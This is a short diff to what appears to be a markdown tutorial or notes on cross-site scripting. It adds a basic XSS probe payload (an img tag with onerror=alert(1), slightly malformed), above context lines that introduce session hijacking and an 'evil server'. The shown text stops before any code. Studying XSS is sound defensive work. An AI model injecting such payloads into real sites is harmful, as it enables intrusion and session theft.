@@ -1,3 +1,7 @@
+# basic payload
+“>img src=x onerror=alert(1)>
+
+
 # XSS attack 1: Hijacking the user’s session
 ## Evil server 
 ```bash
